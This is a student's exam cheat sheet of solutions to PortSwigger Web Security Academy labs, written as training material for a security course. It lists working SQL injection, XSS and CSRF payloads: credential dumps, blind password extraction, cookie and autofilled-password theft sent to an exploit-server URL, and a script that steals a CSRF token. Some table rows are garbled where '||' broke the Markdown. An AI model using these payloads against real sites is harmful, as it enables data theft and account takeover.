# Exam Study — PortSwigger Labs Cheat Sheet (SQLi · XSS · CSRF)

**Source:** PortSwigger Web Security Academy — verified solutions (cross-checked with official labs + frank-leitner/portswigger-websecurity-academy)
**Tools:** Browser + DevTools (F12) only — no Burp, no coding.
**Course:** [[CS451 - Hub|CS451 – Network Security Fundamentals]]
**Tags:** #CS451 #exam #lab #portswigger #sqli #xss #csrf #payloads

> **Authorized use only** — these techniques are for PortSwigger's deliberately-vulnerable labs and systems you're permitted to test.

---

## Quick Lookup Index

**Sections:**
1. The Basics (tools, exploit server)
2. SQL Injection — all labs + payloads
3. Cross-Site Scripting (XSS) — all labs + payloads
4. CSRF — all labs + payloads
5. Deep Dive: UNION column-count, blind SQLi, XSS filter bypass
6. Master Payload Reference

**Key Terms:** payload, address bar, DevTools (F12), Console, Network, Edit and Resend, Storage/Application → Cookies, exploit server, Store/View exploit/Deliver to victim, `'--`, `ORDER BY`, `UNION SELECT`, `information_schema`, `@@version`, `v$version`, `dual`, blind SQLi, `pg_sleep`, `<script>alert(1)</script>`, `onerror`, `onload`, `onfocus`, `onmouseover`, `onresize`, `onbegin`, `svg`, `animatetransform`, `document.cookie`, `document.location`, CSP, `csrf` token, double-submit, Referer, `no-referrer`, `unsafe-url`

---

## 1. The Basics

These labs are vulnerable practice sites. You play the **attacker**: find a badly-handled input and type a **payload**. Success = green **"Solved"** banner.

**Three tools (all in browser):**
1. **Address bar** — many payloads go straight into the URL.
2. **The page** — search boxes, login forms, comment/website fields.
3. **DevTools (F12):**
   - **Console** — type JS, see errors.
   - **Network** — see every request; right-click → **Edit and Resend** (Firefox) to replay/modify.
   - **Storage** (Firefox) / **Application** (Chrome) → **Cookies** — double-click a value to edit it.
   - **Inspector / Elements** — see live HTML; find where your input landed.

**Exploit server** (some labs): a second site with a text box + **Store**, **View exploit** (test on yourself), **Deliver to victim** (runs against the simulated victim to solve the lab).

`LAB-ID` = your lab's web address from the address bar.

---

## 2. SQL Injection

*(Tricking the DB by typing SQL commands into normal inputs. `'` breaks out of string, `--` comments the rest.)*

| Lab                                           | Goal                                                   | Exact Payload / Steps                                                                                                                                                                                                                                                                           |     |                                                  |     |                                                                                                                                                                      |     |           |
| --------------------------------------------- | ------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- | ------------------------------------------------ | --- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- | --------- |
| **1.1** Retrieve hidden data                  | Show unreleased products                               | `?category=Gifts'+OR+1=1--`                                                                                                                                                                                                                                                                     |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.2** Login bypass                          | Log in as administrator                                | Username: `administrator'--` · Password: *(blank)*                                                                                                                                                                                                                                              |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.3** DB version — Oracle                   | Display version string                                 | Step 1 — column count: `'+ORDER+BY+1--`, `'+ORDER+BY+2--` until error (= 2 cols). Step 2 — confirm UNION: `'+UNION+SELECT+NULL,NULL+FROM+dual--`. Step 3 — version: `'+UNION+SELECT+banner,NULL+FROM+v$version--`                                                                               |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.4** DB version — MySQL/Microsoft          | Display version string                                 | `'+UNION+SELECT+@@version,NULL#`                                                                                                                                                                                                                                                                |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.5** List DB contents — non-Oracle         | Find users table, get admin creds, log in              | `'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--` → find `users_xxxx`. Then: `'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_xxxx'--` → find column names. Then: `'+UNION+SELECT+username_col,password_col+FROM+users_xxxx--` → log in |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.6** List DB contents — Oracle             | Same but Oracle catalogs (UPPERCASE)                   | `'+UNION+SELECT+table_name,NULL+FROM+all_tables--` → `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXXX'--` → `'+UNION+SELECT+USERNAME_COL,PASSWORD_COL+FROM+USERS_XXXX--`                                                                                      |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.7** UNION — determine column count        | Find how many columns                                  | Method A: `'+ORDER+BY+1--`, `2--`, `3--`… until error. Method B: `'+UNION+SELECT+NULL--`, `'+UNION+SELECT+NULL,NULL--`… until it loads without error                                                                                                                                            |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.8** UNION — find text column              | Which column holds text                                | Rotate a marker through slots: `'+UNION+SELECT+'abc',NULL--` → `'+UNION+SELECT+NULL,'abc'--` → the slot that shows `abc` in the page is the text column                                                                                                                                         |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.9** UNION — read other tables             | Dump admin credentials                                 | `'+UNION+SELECT+username,password+FROM+users--`                                                                                                                                                                                                                                                 |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.10** UNION — multiple values in one col   | Both fields through one text column                    | `'+UNION+SELECT+NULL,username                                                                                                                                                                                                                                                                   |     | '~'                                              |     | password+FROM+users--` (the `~` separator splits them; use Oracle-style `                                                                                            |     | ` concat) |
| **1.11** Blind — conditional responses        | Extract admin password char-by-char via "Welcome back" | Edit `TrackingId` cookie. TRUE tell: append `' AND 1=1--` (message shows). FALSE tell: `' AND 1=2--` (gone). Char extraction: `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a--` → increment position and char until full password found                   |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.12** Blind — conditional errors           | Extract password via DB error/no-error                 | Edit `TrackingId`. Error on true: `' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)=''--`. Replace `1=1` with char guess: `(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')=''--`                    |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.13** Visible error-based                  | Verbose error prints the value                         | Add `'` to trigger verbose error. Then: `' AND CAST((SELECT password FROM users LIMIT 1) AS int)--` → error message contains the password                                                                                                                                                       |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.14** Blind — time delay (prove injection) | Confirm injection with a ~10s pause                    | Edit `TrackingId`: append `'                                                                                                                                                                                                                                                                    |     | pg_sleep(10)--` → reload; ~10s pause = confirmed |     |                                                                                                                                                                      |     |           |
| **1.15** Blind — time delay + data            | Extract password char-by-char via timing               | `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` → watch request time in Network tab; ~10s = correct char                                                                                                  |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.16 / 1.17** Out-of-band (OAST)            | (DNS/HTTP exfiltration)                                | **Browser-only: skip** — requires Burp Collaborator (external DNS listener). These are the only two labs without a browser-only path.                                                                                                                                                           |     |                                                  |     |                                                                                                                                                                      |     |           |
| **1.18** Filter bypass via XML                | Bypass WAF protecting XML stock-check                  | F12 → Network → click "Check stock" → find XML request → right-click → Edit and Resend. In `<storeId>`: `1 UNION SELECT username                                                                                                                                                                |     | '~'                                              |     | password FROM users`. If WAF blocks, HTML-encode a letter in each SQL keyword: `&#x55;NION` for `UNION`, `&#x53;ELECT` for `SELECT`. Read credentials from response. |     |           |

---

## 3. Cross-Site Scripting (XSS)

*(Get your JavaScript to run on the site. Standard goal = `alert(1)` fires = "Solved".)*

| Lab | Context / filter | Exact Payload |
|---|---|---|
| **2.1** Reflected, nothing encoded | HTML body | `<script>alert(1)</script>` |
| **2.2** Stored, nothing encoded | Blog comment | `<script>alert(1)</script>` → post → reopen post |
| **2.3** DOM — `document.write`, source `location.search` | Breaks into img `src` | `"><svg onload=alert(1)>` |
| **2.4** DOM — `innerHTML` | innerHTML sink | `<img src=1 onerror=alert(1)>` |
| **2.5** DOM — jQuery `href` sink | URL param | `?returnPath=javascript:alert(document.cookie)` → click Back button |
| **2.6** DOM — jQuery selector sink, hashchange | Exploit server iframe | `<iframe src="https://LAB-ID/#" onload="this.src+='<img src=1 onerror=alert(1)>'"></iframe>` → Deliver to victim |
| **2.7** Reflected into HTML attribute, `<>` encoded | `value` attribute; `<>` blocked | `" onmouseover="alert(1)` → hover over the search box to trigger |
| **2.8** Stored into anchor `href`, quotes encoded | `href` attribute of author link | Website field: `javascript:alert(1)` → post → click the author name |
| **2.9** Reflected into JS string, `<>` HTML-encoded | `var q = 'INPUT'` | `';alert(1);//` (close string with `'`, run alert, comment rest with `//`) |
| **2.10** DOM — `document.write` inside `<select>` | `storeId` URL param | `?storeId="></select><img src=1 onerror=alert(1)>` |
| **2.11** DOM — AngularJS expression | AngularJS template expression | `{{$on.constructor('alert(1)')()}}` |
| **2.12** Reflected DOM XSS | `eval()` on JSON response; server escapes `"` but NOT `\` | `\"};alert(1);//` (`\` escapes the server's `"` escape → exposes a raw `"` that closes the string; `}` closes the JSON object; `alert` fires) |
| **2.13** Stored DOM XSS | `replace()` only strips first `<>` pair | `<><img src=1 onerror=alert(1)>` (first `<>` is consumed by the sanitizer; the `img` tag executes) |
| **2.14** Reflected, most tags/attributes blocked | WAF blocks common tags → use `body` + `onresize` | On exploit server, deliver: `<iframe src="https://LAB-ID/?search=%22%3E%3Cbody+onresize=print()%3E" onload=this.style.width='100px'></iframe>` |
| **2.15** Reflected, only custom tags allowed | Standard tags blocked; custom tags pass | On exploit server, deliver: `<script>document.location='https://LAB-ID/?search=<xss+id=x+onfocus=alert(document.cookie)+tabindex=1>#x'</script>` (URL-encode the `<>` if needed; `#x` auto-focuses the element) |
| **2.16** Reflected, some SVG markup allowed | WAF blocks most tags; SVG/animatetransform pass | `<svg><animatetransform onbegin=alert(1) attributeName=transform>` |
| **2.17** Reflected into canonical `<link>` tag | Input lands in `href` of link; event handler via access key | URL: add `'accesskey='X'onclick='alert(1)` to query string → then press **Alt+Shift+X** (Chrome on Windows) |
| **2.18** Reflected in JS string; single-quote `'` AND `\` both escaped | Can't break out of the JS string → break out of the `<script>` tag at HTML level | `</script><script>alert(1)</script>` (HTML parser closes the first script block before JS runs) |
| **2.19** Reflected in JS string; `'` escaped but `\` **not** escaped | `\` neutralises the server's escape-backslash | `\';alert(1);//` (`\` makes the server's `\'` → `\\'` = literal `\` + raw `'` closes string) |
| **2.20** Stored into `onclick` attribute; `<>` `"` encoded, `'` and `\` escaped | HTML entity `&apos;` decoded by browser before JS executes | Website field: `http://foo?&apos;-alert(1)-&apos;` → post → click author name |
| **2.21** Reflected inside JS template literal `` ` `` | Template literal `${...}` evaluated | `${alert(1)}` |
| **2.22** Exploit XSS to **steal cookies** | Stored XSS in comments; no HttpOnly | Comment: `<script>document.location='https://LAB-ID-exploit/?c='+document.cookie</script>` → read cookie from exploit server access log → set it in DevTools → Cookies → reload |
| **2.23** Exploit XSS to **capture passwords** | Stored XSS; victim's browser auto-fills password | Comment: `<input name=username><input type=password name=password onchange="document.location='https://LAB-ID-exploit/?p='+this.value">` → read password from access log |
| **2.24** Exploit XSS to perform **CSRF** (bypass token) | Stored XSS; change-email has CSRF token | See full script below |
| **2.25** AngularJS sandbox escape, no strings | AngularJS app; no string literals allowed | `1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1` |
| **2.26** AngularJS sandbox + CSP | AngularJS + CSP; deliver via exploit server | `<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>#x` in an iframe |
| **2.27** Reflected, events and `href` blocked | Tags allowed, event handlers and `href` blocked | `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>` → click the text |
| **2.28** Reflected in `javascript:` URL, some chars blocked | `()` blocked | `javascript:window.onerror=eval;throw'=alert\x281\x29';` (URL-encode as needed) |
| **2.29** Reflected XSS, CSP bypass via reflected parameter | A URL param ends up in the CSP header | `?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'` |
| **2.30** Reflected XSS, strict CSP — dangling markup | Strict CSP blocks all scripts; steal CSRF token to change email | Two-step: (1) dangling markup to leak CSRF token to exploit server log; (2) CSRF form using leaked token |

---

## 4. CSRF

*(Trick a logged-in victim's browser into submitting a request — goal: change their email. Steps: paste HTML on exploit server → Store → View exploit → Deliver to victim.)*

| Lab | Defense bypassed | Exploit HTML |
|---|---|---|
| **3.1** No defenses | None | Auto-submitting form (see Playbook) |
| **3.2** Token validated on POST but not GET | Switch to GET | `<img src="https://LAB-ID/my-account/change-email?email=pwned@evil.com">` |
| **3.3** Token only validated when present | Omit the token entirely | Use 3.1 form but remove the `<input name="csrf">` line |
| **3.4** Token not tied to user session | Reuse your own valid token | Copy a valid `csrf` value from your own change-email request (F12 → Network), paste it into the hidden field of the 3.1 form |
| **3.5** Token tied to a non-session cookie | Cookie-injection via search + use matching token/cookie pair | (1) Grab your own `csrfKey` cookie + matching `csrf` token. (2) Use the search injection point to plant your `csrfKey` on the victim: `<img src="https://LAB-ID/?search=x%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">` + `<form>` with your matching `csrf` token value |
| **3.6** Token duplicated in cookie (double-submit) | Set both token and cookie to any matching value | `<img src="https://LAB-ID/?search=x%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">` + `<form>` with `<input name="csrf" value="fake">` |
| **3.7** Referer only checked when present | Suppress the Referer entirely | `<meta name="referrer" content="no-referrer">` + auto-submit form |
| **3.8** Broken Referer validation (contains check) | Make Referer contain the lab domain | `<script>history.pushState('','','/?https://LAB-ID')</script>` + auto-submit form. On exploit server, add response header: `Referrer-Policy: unsafe-url` (so full URL is sent as Referer, which now *contains* `LAB-ID`) |

---

## 5. Deep Dive

**UNION column count + text column.** A UNION requires (a) same number of columns and (b) compatible types. Find column count: increment `ORDER BY n--` until error OR add NULLs one by one `UNION SELECT NULL,NULL,...--` until no error. Find text column: rotate `'abc'` through slots. Only then substitute real column names. MySQL comment = `#` or `-- ` (trailing space); Oracle requires `FROM dual` for SELECTs without a table and UPPERCASE system catalogs (`all_tables`, `v$version`).

**Blind SQLi — three tells.** (1) **Boolean** — page renders differently on TRUE vs FALSE (e.g. "Welcome back" appears only when condition is true → extract char-by-char). (2) **Error** — DB throws error on TRUE, no error on FALSE → use `CASE WHEN ... THEN 1/0 ELSE '' END`. (3) **Time** — `pg_sleep(10)` fires only when condition is true → watch response time. Extract password one char at a time using `SUBSTRING(password, position, 1)='x'`, incrementing position and cycling through characters a–z, 0–9.

**XSS context determines the payload.**
- Plain HTML body → `<script>` or `<img onerror>`
- Inside an **attribute** → break out with `"`, inject event handler (`onfocus`, `onmouseover`)
- Inside a **JS string** with `<>` encoded but `'` NOT escaped → close with `'` then `;alert(1);//`
- Inside a **JS string** with BOTH `'` and `\` escaped → can't break out of JS → use `</script><script>` to break out of the HTML `<script>` tag instead
- Inside a **JS string** with `'` escaped but `\` NOT escaped → inject `\` to neutralize the escape, then `'` closes: `\';alert(1);//`
- Inside `eval()` on reflected JSON → `\"` trick: inject `\` (server keeps it) + `"` (server escapes to `\"`) = `\\"` = literal `\` then raw `"` closes the string → then `};alert(1);//`

**XSS→CSRF (Lab 2.24)** works because XSS runs in the victim's own origin — it can read the CSRF token directly from the DOM and use it in a request. No CSRF token can protect against an attacker who already has same-origin script execution.

**CSRF defenses, in order of failure mode:** Token not present → not tied to session → not tied to cookie → GET bypass → double-submit weakness → Referer optional → Referer substring check.

---

## 6. Master Payload Reference

```
# --- SQL INJECTION ---
'--                                       # comment out rest (MySQL/PostgreSQL)
'#                                        # MySQL alternative
administrator'--                          # login bypass
'+ORDER+BY+1--                            # column count (increment until error)
'+UNION+SELECT+NULL,NULL--                # column count (add NULLs until success)
'+UNION+SELECT+'abc',NULL--               # find text column (rotate 'abc')
'+UNION+SELECT+username,password+FROM+users--
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--   # concat (Oracle/PostgreSQL)
'+UNION+SELECT+@@version,NULL#            # MySQL/MSSQL version
'+UNION+SELECT+banner,NULL+FROM+v$version--  # Oracle version
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
'+UNION+SELECT+table_name,NULL+FROM+all_tables--          # Oracle
' AND 1=1--  /  ' AND 1=2--              # blind boolean tell
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a--
'||pg_sleep(10)--                         # blind time delay (PostgreSQL)
```

```
# --- XSS QUICK HITS ---
<script>alert(1)</script>                     # plain HTML context
<img src=1 onerror=alert(1)>                  # innerHTML or attribute without <script>
"><svg onload=alert(1)>                        # break out of attribute into HTML
" onmouseover="alert(1)                       # stay in attribute, add event handler
';alert(1);//                                  # break out of JS string (single quote free)
\';alert(1);//                                 # JS string: single-quote escaped but \ not
</script><script>alert(1)</script>             # JS string: both ' and \ escaped → HTML break
\"};alert(1);//                                # reflected DOM XSS via eval() on JSON
${alert(1)}                                    # JS template literal
<><img src=1 onerror=alert(1)>                # stored DOM (consume first <> with <>, img fires)
<svg><animatetransform onbegin=alert(1) attributeName=transform>  # SVG allowed
{{$on.constructor('alert(1)')()}}              # AngularJS template expression

# --- XSS EXPLOIT PAYLOADS ---
# Steal cookies (comment, stored XSS):
<script>document.location='https://LAB-ID-exploit/?c='+document.cookie</script>

# Capture auto-fill password (comment):
<input name=username><input type=password name=password onchange="document.location='https://LAB-ID-exploit/?p='+this.value">

# WAF bypass — deliver via exploit server iframe:
<iframe src="https://LAB-ID/?search=%22%3E%3Cbody+onresize=print()%3E" onload=this.style.width='100px'></iframe>

# Custom tags only:
<script>document.location='https://LAB-ID/?search=<xss+id=x+onfocus=alert(document.cookie)+tabindex=1>#x'</script>
```

```html
<!-- CSRF — base (no defenses) -->
<form action="https://LAB-ID/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@evil.com">
</form>
<script>document.forms[0].submit()</script>

<!-- CSRF — suppress Referer (lab 3.7) -->
<meta name="referrer" content="no-referrer">
<form action="https://LAB-ID/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@evil.com">
</form>
<script>document.forms[0].submit()</script>

<!-- CSRF — broken Referer validation (lab 3.8) -->
<script>history.pushState('','','/?https://LAB-ID')</script>
<form action="https://LAB-ID/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@evil.com">
</form>
<script>document.forms[0].submit()</script>
<!-- Also: on exploit server add response header: Referrer-Policy: unsafe-url -->

<!-- XSS → CSRF: steal token then change email (lab 2.24) -->
<script>
var r=new XMLHttpRequest();
r.onload=function(){
  var t=/csrf" value="([^"]+)"/.exec(this.responseText)[1];
  var c=new XMLHttpRequest();
  c.open('POST','/my-account/change-email',true);
  c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  c.send('csrf='+t+'&email=pwned@evil.com');
};
r.open('GET','/my-account',true);
r.send();
</script>
```

---

## Knowledge Check Q&A

**Q1:** What are the two preliminary steps before a UNION data-extraction attack?
**A:** (1) Determine the **column count** (`ORDER BY n--` until error, or `UNION SELECT NULL,...` until loads). (2) Find which column holds **text** (rotate `'abc'` through slots).

**Q2:** A page shows no output and no error. How do you confirm SQLi?
**A:** **Time-based blind**: inject `'||pg_sleep(10)--` and watch for a ~10s response delay.

**Q3:** Your XSS input lands inside a JS string, and BOTH `'` and `\` are escaped. What do you do?
**A:** You cannot break out of the JS string — instead break out of the HTML `<script>` tag using `</script><script>alert(1)</script>`. The HTML parser processes the closing tag before JS runs.

**Q4:** Your input is in a JS string where `'` is escaped but `\` is NOT. What payload breaks out?
**A:** `\';alert(1);//` — injecting `\` neutralizes the server's `\'` into `\\'` (literal `\` + raw `'` that closes the string).

**Q5:** Why does XSS defeat CSRF token protection (lab 2.24)?
**A:** The injected script runs in the **victim's own origin**, so it can read the CSRF token directly from the DOM and include it in a forged request — the same-origin policy doesn't protect against same-origin scripts.

**Q6:** Labs 1.16 and 1.17 can't be solved browser-only. Why?
**A:** They require the database to send an **out-of-band DNS/HTTP request** to an attacker-controlled server. A browser can't receive external DNS requests — you need Burp Collaborator.

**Q7:** Lab 3.8 (broken Referer). Why add `Referrer-Policy: unsafe-url` as a response header on the exploit server?
**A:** It instructs the victim's browser to send the **full URL** (including path `/?https://LAB-ID`) as the `Referer` header when navigating from the exploit page to the target. The target's broken validation passes because the header merely *contains* the lab domain as a substring.

---

## Graph View Links

**Previous**: [[Exam Study - SocialNet Security Lab (ATT-1 to ATT-7)]]
**Next**: —
**Hub**: [[CS451 - Hub]]
**Related**: [[Exam Study - Web Application Security]], [[Exam Study - Module 3 (Threats and Attacks on Endpoints)]]
